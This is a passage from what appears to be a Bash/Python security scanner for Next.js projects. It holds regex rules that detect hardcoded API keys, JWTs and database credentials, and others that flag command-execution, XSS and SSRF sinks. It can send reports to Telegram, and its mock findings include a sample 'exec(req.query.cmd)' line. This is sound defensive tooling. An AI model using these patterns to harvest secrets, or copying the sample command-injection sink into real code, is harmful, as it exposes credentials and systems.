      "recommendation": "Move to server-side env/secret manager and rotate exposed credentials.",
      "confidence": "medium",
    },
    {
      "kind": "token",
      "severity": "high",
      "category": "secrets",
      "title": "Possible SendGrid API key",
      "match_type": "sendgrid_key",
      "regex": r"\bSG\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs","**/*.json","**/.env*"],
      "scenario": "If valid, an attacker can send email or access SendGrid resources in scope.",
      "recommendation": "Rotate the key and move it to a secret manager.",
      "confidence": "high",
    },
    {
      "kind": "token",
      "severity": "high",
      "category": "secrets",
      "title": "Possible Mailgun API key",
      "match_type": "mailgun_key",
      "regex": r"\bkey-[0-9a-f]{32}\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs","**/*.json","**/.env*"],
      "scenario": "If valid, an attacker can send email or manage Mailgun resources in scope.",
      "recommendation": "Rotate the key and keep it in a secret manager.",
      "confidence": "high",
    },
    {
      "kind": "token",
      "severity": "medium",
      "category": "secrets",
      "title": "Possible JWT token literal in code/log",
      "match_type": "jwt_literal",
      "regex": r"\beyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs","**/*.json","**/.env*"],
      "scenario": "If this JWT is still valid and not bound to device/session, it may allow impersonation until expiry.",
      "recommendation": "Avoid logging tokens, invalidate sessions if needed, and ensure short expiry + rotation.",
      "confidence": "medium",
    },
    {
      "kind": "token",
      "severity": "high",
      "category": "secrets",
      "title": "Database URL with embedded credentials",
      "match_type": "db_url_with_creds",
      "regex": r"\b(?:postgres(?:ql)?|mysql|mariadb|mongodb(?:\+srv)?|redis|amqp)\:\/\/[^\s\"']{1,256}\:[^\s\"']{1,256}\@[^\s\"']+\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs","**/*.json","**/*.yml","**/*.yaml","**/.env*"],
      "scenario": "Embedded DB credentials can allow direct database access if exposed and reachable.",
      "recommendation": "Move DB creds to secret manager/env, rotate credentials, and restrict network access.",
      "confidence": "high",
    },
    {
      "kind": "token",
      "severity": "medium",
      "category": "secrets",
      "title": "Generic hardcoded secret-like value",
      "match_type": "generic_secret_value",
      "regex": r"(?i)(?:api[_-]?key|secret|token|password|passwd|pwd|client[_-]?secret|private[_-]?key|access[_-]?token|refresh[_-]?token)\s*[:=]\s*[\"']([^\"'\n]{6,})[\"']",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs","**/*.json","**/*.yml","**/*.yaml","**/.env*"],
      "scenario": "Hardcoded secrets in source may be extracted by anyone with repo access, logs, or client bundle access (if shipped).",
      "recommendation": "Use environment/secret manager, rotate exposed secrets, and avoid committing credentials.",
      "confidence": "medium",
    },
  ]
}
print(json.dumps(cfg, ensure_ascii=False))
PY
)"
  python_static_scan "$cfg"
}

scan_risky_patterns() {
  log "Scanning risky code patterns (incl. RCE)..."

  local cfg
  cfg="$("$PY_BIN" - <<'PY'
import json

cfg = {
  "envfile_globs": [],
  "rules": [
    {
      "kind": "line",
      "severity": "high",
      "category": "rce",
      "title": "Possible OS command execution sink (child_process)",
      "match_type": "child_process_exec",
      "regex": r"\bchild_process\b|\b(execSync|exec|spawn|spawnSync|fork)\s*\(",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs"],
      "scenario": "If attacker-controlled input reaches command arguments, it may lead to remote code execution or arbitrary command execution.",
      "recommendation": "Avoid shell execution; use safe APIs, validate/allowlist inputs, and never pass untrusted strings to a shell.",
      "confidence": "medium",
    },
    {
      "kind": "line",
      "severity": "high",
      "category": "rce",
      "title": "Dynamic code execution (eval / Function)",
      "match_type": "dynamic_eval",
      "regex": r"\beval\s*\(|\bnew\s+Function\s*\(",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs"],
      "scenario": "If attacker-controlled input reaches dynamic evaluation, it can become arbitrary code execution.",
      "recommendation": "Remove eval/Function usage; use safe parsers or structured data formats.",
      "confidence": "high",
    },
    {
      "kind": "line",
      "severity": "high",
      "category": "file_upload",
      "title": "File upload handler detected (multer/formidable/busboy)",
      "match_type": "file_upload_handler",
      "regex": r"\b(multer|formidable|busboy)\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs"],
      "scenario": "Unsafe upload handling can enable path traversal, stored XSS, or RCE chains depending on storage and post-processing.",
      "recommendation": "Validate file type/size, store outside webroot, randomize filenames, and enforce strict allowlists.",
      "confidence": "medium",
    },
    {
      "kind": "line",
      "severity": "high",
      "category": "file_upload",
      "title": "Archive extraction detected (zip/tar) - watch for Zip Slip",
      "match_type": "archive_extract",
      "regex": r"\b(unzipper|adm-zip|node-tar|tar\.x|tar\.extract|extract-zip)\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs"],
      "scenario": "If extracting attacker-controlled archives without path validation, it may overwrite arbitrary files (Zip Slip) and lead to RCE or data loss.",
      "recommendation": "Validate archive entries, strip absolute/.. paths, extract to isolated directory, and avoid auto-executing extracted content.",
      "confidence": "medium",
    },
    {
      "kind": "line",
      "severity": "medium",
      "category": "file_upload",
      "title": "Writes files to disk (watch for path traversal)",
      "match_type": "fs_write",
      "regex": r"\bfs\.(writeFileSync|writeFile|createWriteStream|appendFileSync|appendFile)\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs"],
      "scenario": "If the path is derived from user input, an attacker may write/overwrite arbitrary files (path traversal) and potentially reach RCE.",
      "recommendation": "Normalize/allowlist paths, generate server-side filenames, and write only under a dedicated directory.",
      "confidence": "low",
    },
    {
      "kind": "line",
      "severity": "medium",
      "category": "xss",
      "title": "dangerouslySetInnerHTML usage",
      "match_type": "dangerously_set_inner_html",
      "regex": r"\bdangerouslySetInnerHTML\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs"],
      "scenario": "If attacker-controlled HTML reaches this sink, it can result in stored/reflected XSS.",
      "recommendation": "Avoid raw HTML rendering; sanitize with a strict allowlist and set CSP.",
      "confidence": "medium",
    },
    {
      "kind": "line",
      "severity": "medium",
      "category": "xss",
      "title": "rehype-raw / raw HTML in Markdown pipeline",
      "match_type": "rehype_raw",
      "regex": r"\brehype-raw\b|\ballowDangerousHtml\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs","**/*.json","**/*.yml","**/*.yaml"],
      "scenario": "If untrusted Markdown/HTML is rendered with raw HTML enabled, it can lead to XSS.",
      "recommendation": "Disable raw HTML, sanitize input, and enforce a strong CSP.",
      "confidence": "medium",
    },
    {
      "kind": "line",
      "severity": "medium",
      "category": "ssrf",
      "title": "Potential SSRF sink (fetch/axios with dynamic URL)",
      "match_type": "ssrf_sink",
      "regex": r"\b(fetch|axios\.(get|post|request)|got)\s*\(\s*[^\"'\)]",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs"],
      "scenario": "If user-controlled URL reaches server-side requests, it may access internal services (SSRF).",
      "recommendation": "Allowlist hostnames, block private IP ranges, and avoid proxying arbitrary URLs.",
      "confidence": "low",
    },
    {
      "kind": "line",
      "severity": "low",
      "category": "open_redirect",
      "title": "Potential open redirect (redirect with variable)",
      "match_type": "redirect_variable",
      "regex": r"\bredirect\s*\(\s*[^\"'\)]",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs"],
      "scenario": "If redirect targets are attacker-controlled, it can enable phishing or auth-token leakage via redirect chains.",
      "recommendation": "Allowlist redirect targets and validate against same-origin or known paths.",
      "confidence": "low",
    },
  ]
}
print(json.dumps(cfg, ensure_ascii=False))
PY
)"
  python_static_scan "$cfg"
}

audit_deps() {
  (( SKIP_DEPS == 1 )) && return 0
  if [[ ! -f "$ROOT/package.json" ]]; then
    printf '{"skipped":true,"reason":"package.json not found"}' >"$1"
    return 0
  fi
  log "Auditing dependencies (npm/pnpm/yarn audit)..."

  local audit_json="$1"
  local pm="unknown"
  if [[ -f "$ROOT/pnpm-lock.yaml" ]]; then pm="pnpm"; fi
  if [[ -f "$ROOT/yarn.lock" ]]; then pm="yarn"; fi
  if [[ -f "$ROOT/package-lock.json" ]]; then pm="npm"; fi

  local cmd=()
  case "$pm" in
    pnpm) cmd=(pnpm audit --json) ;;
    yarn) cmd=(yarn audit --json) ;;
    npm|unknown) cmd=(npm audit --json) ;;
  esac

  if ! command -v "${cmd[0]}" >/dev/null 2>&1; then
    log "WARN: ${cmd[0]} not available; skipping dependency audit."
    printf '{"skipped":true,"reason":"package manager not available"}' >"$audit_json"
    return 0
  fi

  (cd "$ROOT" && "${cmd[@]}" >"$audit_json" 2>/dev/null) || {
    log "WARN: dependency audit command failed; continuing."
    AUDIT_CMD="${cmd[*]}" "$PY_BIN" - <<'PY' >"$audit_json"
import json, os
print(json.dumps({"failed": True, "cmd": os.environ.get("AUDIT_CMD","")}, ensure_ascii=False))
PY
  }
}

counts_json_file() {
  local file="$1"
  FINDINGS_FILE="$file" "$PY_BIN" - <<'PY'
import json, os
path=os.environ["FINDINGS_FILE"]
counts={"critical":0,"high":0,"medium":0,"low":0,"info":0}
with open(path,"r",encoding="utf-8") as f:
  for line in f:
    line=line.strip()
    if not line: continue
    try:
      obj=json.loads(line)
    except Exception:
      continue
    sev=obj.get("severity","info")
    if sev not in counts: counts[sev]=0
    counts[sev]+=1
print(json.dumps(counts, ensure_ascii=False))
PY
}

make_result_json() {
  local layout_json="$1"
  local git_json="$2"
  local deps_json="$3"
  local findings_file="$4"
  local counts
  counts="$(counts_json_file "$findings_file")"
  META_TOOL="$TOOL_NAME" META_VERSION="$VERSION" META_TIMESTAMP="$(date -Iseconds)" META_ROOT="$(cd "$ROOT" && pwd -P)" \
  META_LAYOUT="$layout_json" META_GIT="$git_json" META_DEPS="$deps_json" META_COUNTS="$counts" FINDINGS_FILE="$findings_file" \
  "$PY_BIN" - <<'PY'
import json, os

def loads_or_fallback(s, fallback):
  try:
    return json.loads(s)
  except Exception:
    return fallback

layout=loads_or_fallback(os.environ.get("META_LAYOUT","{}"), {})
git=loads_or_fallback(os.environ.get("META_GIT","{}"), {})
deps_raw=os.environ.get("META_DEPS","{}")
deps=loads_or_fallback(deps_raw, {"raw": deps_raw})
counts=loads_or_fallback(os.environ.get("META_COUNTS","{}"), {})

findings=[]
with open(os.environ["FINDINGS_FILE"], "r", encoding="utf-8") as f:
  for line in f:
    line=line.strip()
    if not line: continue
    try:
      findings.append(json.loads(line))
    except Exception:
      continue

out={
  "meta":{
    "tool": os.environ.get("META_TOOL",""),
    "version": os.environ.get("META_VERSION",""),
    "timestamp": os.environ.get("META_TIMESTAMP",""),
    "root": os.environ.get("META_ROOT",""),
    "layout": layout,
    "git": git,
  },
  "counts": counts,
  "deps_audit": deps,
  "findings": findings,
}
print(json.dumps(out, ensure_ascii=False, indent=2))
PY
}

severity_emoji() {
  case "$1" in
    critical) printf '🔥' ;;
    high) printf '🚨' ;;
    medium) printf '⚠️' ;;
    low) printf 'ℹ️' ;;
    info) printf '✅' ;;
    *) printf '•' ;;
  esac
}

telegram_send_message() {
  local token="$1" chat_id="$2" html="$3"
  curl -fsS \
    -X POST "https://api.telegram.org/bot${token}/sendMessage" \
    -d "chat_id=${chat_id}" \
    --data-urlencode "text=${html}" \
    -d "parse_mode=HTML" \
    -d "disable_web_page_preview=true" >/dev/null
}

telegram_send_document() {
  local token="$1" chat_id="$2" file="$3" caption_html="$4"
  curl -fsS \
    -X POST "https://api.telegram.org/bot${token}/sendDocument" \
    -F "chat_id=${chat_id}" \
    -F "document=@${file}" \
    -F "caption=${caption_html}" \
    -F "parse_mode=HTML" >/dev/null
}

read_secret_from_file() {
  local path="$1"
  [[ -n "$path" ]] || return 1
  [[ -f "$path" ]] || return 1
  # Trim CRLF/newlines; keep the rest verbatim.
  tr -d '\r\n' <"$path"
}

get_telegram_creds() {
  local token="${TELEGRAM_BOT_TOKEN:-$TELEGRAM_BOT_TOKEN_DEFAULT}"
  local chat_id="${TELEGRAM_CHAT_ID:-$TELEGRAM_CHAT_ID_DEFAULT}"

  if [[ -z "$token" && -n "${TELEGRAM_BOT_TOKEN_FILE:-}" ]]; then
    token="$(read_secret_from_file "$TELEGRAM_BOT_TOKEN_FILE" || true)"
  fi
  if [[ -z "$chat_id" && -n "${TELEGRAM_CHAT_ID_FILE:-}" ]]; then
    chat_id="$(read_secret_from_file "$TELEGRAM_CHAT_ID_FILE" || true)"
  fi

  printf '%s\n%s\n' "$token" "$chat_id"
}

telegram_summary_html() {
  local counts_json="$1"
  local section_title="${2:-Next.js Whitebox Audit}"
  local root_disp
  root_disp="$(cd "$ROOT" && pwd -P)"

  local critical high medium low info
  critical="$(COUNTS_JSON="$counts_json" "$PY_BIN" - <<'PY'
import json, os
print(json.loads(os.environ["COUNTS_JSON"]).get("critical",0))
PY
)"
  high="$(COUNTS_JSON="$counts_json" "$PY_BIN" - <<'PY'
import json, os
print(json.loads(os.environ["COUNTS_JSON"]).get("high",0))
PY
)"
  medium="$(COUNTS_JSON="$counts_json" "$PY_BIN" - <<'PY'
import json, os
print(json.loads(os.environ["COUNTS_JSON"]).get("medium",0))
PY
)"
  low="$(COUNTS_JSON="$counts_json" "$PY_BIN" - <<'PY'
import json, os
print(json.loads(os.environ["COUNTS_JSON"]).get("low",0))
PY
)"
  info="$(COUNTS_JSON="$counts_json" "$PY_BIN" - <<'PY'
import json, os
print(json.loads(os.environ["COUNTS_JSON"]).get("info",0))
PY
)"

  local header
  header="<b>🛡️ $(html_escape "$section_title")</b>\n<b>📁 Root:</b> <code>$(html_escape "$root_disp")</code>\n"
  header+="<b>📊 Summary:</b> 🔥 Critical: ${critical} | 🚨 High: ${high} | ⚠️ Medium: ${medium} | ℹ️ Low: ${low} | ✅ Info: ${info}\n"

  local body="<b>🚩 Top Findings</b>\n"
  local rows
  ROWS_N="$TOP_FINDINGS" FINDINGS_FILE="$FINDINGS_JSONL" "$PY_BIN" - <<'PY' >"$TMPDIR/top_findings.tsv"
import json, os
path=os.environ["FINDINGS_FILE"]
n=int(os.environ.get("ROWS_N","8"))
rank={"critical":0,"high":1,"medium":2,"low":3,"info":4}
items=[]
with open(path,"r",encoding="utf-8") as f:
  for line in f:
    line=line.strip()
    if not line: continue
    try:
      o=json.loads(line)
    except Exception:
      continue
    items.append(o)
items.sort(key=lambda o: (rank.get(o.get("severity","info"), 9), o.get("id","")))
for o in items[:n]:
  ev=o.get("evidence") or {}
  print("\t".join([
    o.get("id",""),
    o.get("severity",""),
    o.get("title",""),
    str(ev.get("file","")),
    str(ev.get("line",0)),
  ]))
PY
  local i=0
  while IFS=$'\t' read -r id sev title file line; do
    [[ -z "$id" ]] && continue
    i=$((i + 1))
    body+="${i}) $(severity_emoji "$sev") <b>[$(html_escape "$id")]</b> $(html_escape "$title")\n"
    body+="<code>$(html_escape "$file"):${line}</code>\n"
  done <"$TMPDIR/top_findings.tsv"

  printf '%b%b' "$header" "$body"
}

make_mock_findings() {
  : >"$FINDINGS_JSONL"
  add_finding "critical" "secrets" "Client-exposed secret-like NEXT_PUBLIC var: NEXT_PUBLIC_API_KEY" "app/page.tsx" 12 "NEXT_PUBLIC_API_KEY=<redacted:32:deadbeefcafe>" "env_assignment" "<redacted:32:deadbeefcafe>" "If shipped to the client bundle, any user can extract it and abuse the backing API." "Move secret server-side (non-NEXT_PUBLIC) and rotate immediately." "high"
  add_finding "high" "rce" "Possible OS command execution sink (child_process)" "app/api/run/route.ts" 48 "exec(req.query.cmd)" "child_process_exec" "<redacted>" "If untrusted input reaches command arguments, it may lead to arbitrary command execution." "Remove shell execution; allowlist inputs; use safe APIs." "medium"
  add_finding "medium" "xss" "dangerouslySetInnerHTML usage" "components/Preview.tsx" 27 "dangerouslySetInnerHTML={{__html: userHtml}}" "dangerously_set_inner_html" "<redacted>" "If attacker-controlled HTML reaches this sink, it can become stored/reflected XSS." "Sanitize with strict allowlist and set CSP." "medium"
}

telegram_test_or_preview() {
  make_mock_findings
  local counts
  counts="$(counts_json_file "$FINDINGS_JSONL")"
  local msg
  msg="$(telegram_summary_html "$counts" "Mock Whitebox Audit")"

  if (( TELEGRAM_PREVIEW == 1 )); then
    printf '%b\n' "$msg"
  fi

  if (( SEND_TELEGRAM == 1 )); then
    local token chat_id creds
    creds="$(get_telegram_creds)"
    token="$(printf '%s\n' "$creds" | sed -n '1p')"
    chat_id="$(printf '%s\n' "$creds" | sed -n '2p')"
    [[ -n "$token" && -n "$chat_id" ]] || die "Telegram creds missing; set TELEGRAM_BOT_TOKEN + TELEGRAM_CHAT_ID (or *_FILE variants)"

    telegram_send_message "$token" "$chat_id" "$msg"

    local mock_result="$TMPDIR/result.mock.json"
    make_result_json '{"router":"app","package_mentions_next":true}' '{"present":false}' '{"skipped":true,"reason":"telegram-test"}' "$FINDINGS_JSONL" >"$mock_result"
    telegram_send_document "$token" "$chat_id" "$mock_result" "<b>📎 Attached:</b> <code>result.mock.json</code>"
  fi
}

exit_code_from_counts() {
  local counts_json="$1"
  local critical high
  critical="$(COUNTS_JSON="$counts_json" "$PY_BIN" - <<'PY'
import json, os
print(json.loads(os.environ["COUNTS_JSON"]).get("critical",0))
PY
)"
  high="$(COUNTS_JSON="$counts_json" "$PY_BIN" - <<'PY'
import json, os
print(json.loads(os.environ["COUNTS_JSON"]).get("high",0))
PY
)"
  if [[ "$critical" != "0" || "$high" != "0" ]]; then
    return 2
  fi
  return 0
}

write_text_report() {
  local findings_file="$1"
  local out_file="$2"
  REPORT_FILE="$findings_file" "$PY_BIN" - <<'PY' >"$out_file"
import json, os
path=os.environ["REPORT_FILE"]
sev_rank = {"critical":0,"high":1,"medium":2,"low":3,"info":4}
sev_emoji = {"critical":"🔥","high":"🚨","medium":"⚠️","low":"ℹ️","info":"✅"}
items=[]
with open(path,"r",encoding="utf-8") as f:
  for line in f:
    line=line.strip()
    if not line:
      continue
    try:
      o=json.loads(line)
    except Exception:
      continue
    items.append(o)

items.sort(key=lambda o: (sev_rank.get(o.get("severity","info"),9), o.get("id","")))
counts = {"critical":0,"high":0,"medium":0,"low":0,"info":0}
for o in items:
  s=o.get("severity","info")
  counts[s]=counts.get(s,0)+1

lines=[]
lines.append("🛡️ WHITEBOX AUDIT REPORT")
lines.append("="*68)
lines.append(f"Summary  | 🔥 Critical {counts.get('critical',0)} | 🚨 High {counts.get('high',0)} | ⚠️ Medium {counts.get('medium',0)} | ℹ️ Low {counts.get('low',0)} | ✅ Info {counts.get('info',0)}")
lines.append("")

for idx, o in enumerate(items, start=1):
  ev=o.get("evidence") or {}
  sev=o.get("severity","info")
  sev_tag=sev.upper()
  fid=o.get("id","")
  title=o.get("title","")
  file=ev.get("file","")
  line_no=ev.get("line",0)
  snippet=ev.get("snippet","")
  rec=o.get("recommendation","")
  scenario=o.get("attack_scenario","")
  emoji=sev_emoji.get(sev,"•")
  lines.append(f"{idx:02d}. {emoji} [{sev_tag}] {fid}")
  lines.append(f"    Title    : {title}")
  lines.append(f"    Location : {file}:{line_no}")
  if snippet:
    lines.append(f"    Snippet  : {snippet}")
  if scenario:
    lines.append(f"    Scenario : {scenario}")
  if rec:
    lines.append(f"    Fix      : {rec}")
  lines.append("-"*68)

print("\n".join(lines).rstrip())
PY
}

send_phase_report() {
  local phase_title="$1"
  local findings_file="$2"
  local out_file="$3"

  local counts
  counts="$(counts_json_file "$findings_file")"
  local msg
  msg="$(telegram_summary_html "$counts" "$phase_title")"

  if (( TELEGRAM_PREVIEW == 1 )); then
    printf '%b\n' "$msg"
  fi

  if (( SEND_TELEGRAM == 1 )); then
    local token chat_id creds
    creds="$(get_telegram_creds)"
    token="$(printf '%s\n' "$creds" | sed -n '1p')"
    chat_id="$(printf '%s\n' "$creds" | sed -n '2p')"
    if [[ -z "$token" || -z "$chat_id" ]]; then
      log "WARN: TELEGRAM_BOT_TOKEN/TELEGRAM_CHAT_ID not set; skipping Telegram send."
      return 0
    fi
    if ((${#msg} > 3500)); then
      msg="${msg:0:3400}\n<b>…truncated…</b>\n"
    fi
    telegram_send_message "$token" "$chat_id" "$msg" || log "WARN: Telegram sendMessage failed"
    telegram_send_document "$token" "$chat_id" "$out_file" "<b>📎 Attached:</b> <code>$(html_escape "$out_file")</code>" || log "WARN: Telegram sendDocument failed"
  fi
}

main() {
  parse_args "$@"
  ROOT="$(cd "$ROOT" && pwd -P)"

  need_cmd curl
  pick_python
  command -v git >/dev/null 2>&1 || true

  TMPDIR="$(make_tmpdir)"
  trap 'rm -rf "${TMPDIR:-}"' EXIT
  FINDINGS_JSONL="$TMPDIR/findings.jsonl"
  HARD_FINDINGS_JSONL="$TMPDIR/findings_hardcode.jsonl"
  VULN_FINDINGS_JSONL="$TMPDIR/findings_vuln.jsonl"
  RAW_LOCAL_FILE=""
  : >"$FINDINGS_JSONL"

  if (( TELEGRAM_TEST == 1 )); then
    telegram_test_or_preview
    exit 0
  fi

  local layout git_json deps_json_file deps_json
  layout="$(detect_next_layout)"
  git_json="$(git_meta_json)"

  if (( SCAN_VULN == 0 )); then
    SKIP_DEPS=1
  fi
  deps_json_file="$TMPDIR/deps_audit.json"
  audit_deps "$deps_json_file"
  deps_json="$(cat "$deps_json_file" 2>/dev/null || printf '{}')"

  # Phase 1: Hardcoded secrets + runtime vars
  FINDINGS_JSONL="$HARD_FINDINGS_JSONL"
  if (( UNSAFE_RAW_LOCAL == 1 )); then
    RAW_LOCAL_FILE="$OUT_RAW_LOCAL"
    : >"$RAW_LOCAL_FILE"
  fi
  : >"$FINDINGS_JSONL"
  scan_secrets
  if (( SCAN_DOMAINS == 1 )); then
    scan_domains
  fi

  log "Scanning runtime variables via env/set (redacted)..."
  scan_runtime_vars "env" "$(env 2>/dev/null || true)"
  scan_runtime_vars "set" "$(set 2>/dev/null || true)"
  if (( SCAN_DOMAINS == 1 )); then
    scan_runtime_domains "env" "$(env 2>/dev/null || true)"
    scan_runtime_domains "set" "$(set 2>/dev/null || true)"
  fi

  write_text_report "$HARD_FINDINGS_JSONL" "$OUT_HARDCODE"
  send_phase_report "Hardcoded Secrets Scan" "$HARD_FINDINGS_JSONL" "$OUT_HARDCODE"

  # Phase 2: Vulnerability patterns (optional)
  if (( SCAN_VULN == 1 )); then
    FINDINGS_JSONL="$VULN_FINDINGS_JSONL"
    : >"$FINDINGS_JSONL"
    scan_risky_patterns
    write_text_report "$VULN_FINDINGS_JSONL" "$OUT_VULN"
    send_phase_report "Vulnerability Pattern Scan" "$VULN_FINDINGS_JSONL" "$OUT_VULN"
  else
    : >"$VULN_FINDINGS_JSONL"
  fi

  log "Writing $OUT_FILE ..."
  cat "$HARD_FINDINGS_JSONL" "$VULN_FINDINGS_JSONL" >"$FINDINGS_JSONL"
  make_result_json "$layout" "$git_json" "$deps_json" "$FINDINGS_JSONL" >"$OUT_FILE"
  local counts
  COUNTS_FILE="$OUT_FILE" "$PY_BIN" - <<'PY' >"$TMPDIR/counts.json"
import json, os
o=json.load(open(os.environ["COUNTS_FILE"],"r",encoding="utf-8"))
print(json.dumps(o.get("counts",{}), ensure_ascii=False))
PY
  counts="$(cat "$TMPDIR/counts.json")"

  exit_code_from_counts "$counts"
}

main "$@"
